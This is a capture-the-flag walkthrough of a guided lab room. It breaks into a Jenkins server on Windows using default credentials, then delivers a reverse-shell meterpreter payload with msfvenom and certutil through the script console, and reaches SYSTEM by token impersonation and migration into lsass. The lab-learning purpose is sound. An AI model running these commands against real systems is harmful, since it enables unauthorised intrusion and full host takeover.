This room is guided, however, I will still write out my process here. Since I already know the target IP address, I will not be performing Host Discovery. I try to make it a habit with THM and HTB machines to make the target IP an environment variable with `export IP=<target IP>`
# Port Scanning

First I start with my full TCP port scan with `nmap -Pn -p- -T4 $IP`

```
nmap -Pn -p- -T4 $IP
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.128.105
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 171.86 seconds
```
This answers question 1.

Here we have ports 80, 3389, and 8080. These are relatively self-explanatory, but I will use my service scans anyway. I will then also move onto using gobuster for directory enumeration and looking at the webpage(s) directly.
```

# Enumeration
Interesting, we find a robots.txt file, the hostname, and likely some service running on port 8080 called Jetty. Lets start a gobuster scan and see what we find. Meanwhile, lets check out the webpages themselves. Just going to the IP in the web browser brings up a RIP Bruce Wayne page, asking for donations - funny. I'll check `http://$IP:8080` next.

![[JenkinsLogin.png]]

So, now we're at a Jenkin's login form. We can look up jenkins's default credentials, brute force this form with hydra or burp suite using names like alfred, bruce, admin, administrator, etc, or we can just handtype a few guesses first. Lets try some combinations of admin:password, admin:admin, etc.

We can also note that gobuster didn't return anything on the base IP.
```

However, admin:admin worked! And we're greeted with a dashboard page.

![[JenkinsDashboard.png]]

So, it looks like there's a way to trigger remote code execution in the project folder via "Windows Batch Commands", but I'm not sure if this is the route. There is also a script console that will definitely run RCE on the box. The guide mentions something else, but if we have RCE through this script console, we can try using certutil.exe to download a meterpreter payload here.

![[JenkinsScriptConsole.png]]

# Gaining a Foothold

Now on our attack box, or my Kali VM, I start up a simple python http listener. 
`python3 -m http.server 80`

Then generate our payload in the directory we're hosting our python "web server".
`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<my VPN IP> LPORT=4444 -f exe -o meterpshell.exe`

We can use `ls -la` in the directory to get the size of this payload for one of our questions since we're using that same payload they recommend.
```
total 84
drwxr-xr-x 2 kali kali  4096 Jul  2 10:09 .
drwxr-xr-x 6 kali kali  4096 Jul  2 09:06 ..
-rw-r--r-- 1 kali kali 73802 Jul  2 10:09 meterpshell.exe
```

Now, we input our certutil.exe command.

![[JenkinsScriptConsoleUpload.png]]

After a few moments we get confirmation the file was uploaded.

![[JenkinsCertUtilUploadSuccessful.png]]

When we look at the web server we're hosting also confirms this:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.128.105 - - [] "GET /meterpshell.exe HTTP/1.1" 200 -
10.10.128.105 - - [] "GET /meterpshell.exe HTTP/1.1" 200 -
```

Now we can stop our little webserver and open msfconsole.
`service postgresql start`
`msfconsole`
And we want to set up our msfconsole listener.
`use exploit/multi/handler`
And then set our PAYLOAD as the reverseshell created before and the LHOST to our IP
`set PAYLOAD windows/meterpreter/reverse_tcp`
`set LHOST <my VPN IP>`
And run it.
`run`

Now, in the Jenkins script console, let's execute our payload.
`println "meterpshell.exe".execute().text` 

Confirm we're on the box!
```
[*] Started reverse TCP handler on 10.13.62.120:4444 
[*] Sending stage (176198 bytes) to 10.10.128.105
[*] Meterpreter session 1 opened (10.13.62.120:4444 -> 10.10.128.105:49288) -0400

meterpreter > 
```
# Privilege Escalation

Now that we're on the box, lets grab the user flag for our question.

`cd /users/bruce/desktop`

`cat user.txt`

Following the guide, they're telling us to use token impersonation. Lets check that. In meterpreter, we drop into the shell with `shell` and run the provided command.

```
C:\users\bruce\Desktop>whoami /priv
whoami /priv

```

Debug, Impersonate, and Create Global are all enabled for the Bruce user.

Now, we can load the incognito module like the room suggests.
First, exit the shell session.
`exit`
Then, 
`load incognito`

Using impersonate, we can become NT AUTHORITY\SYSTEM
```
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
This answers one of our questions.

Next, we need to migrate to the LSASS.exe process.

`pgrep lsass.exe`

```
meterpreter > pgrep lsass
676
meterpreter > migrate 676
[*] Migrating from 3020 to 676...
[*] Migration completed successfully.
```

Now instead of impersonating SYSTEM, we *are* SYSTEM.

# Post Exploitation

Now to just navigate to the flag location and answer the final question.
I had to drop into a shell due to meterpreter prompt giving funky characters when I tried to `cat` out the file.

It is worth noting that Incognito has its [own standalone exe](https://github.com/FSecureLABS/incognito/blob/394545ffb844afcc18e798737cbd070ff3a4eb29/incognito.exe) (which Windows will flag as a virus if you try downloading it to a Windows host)
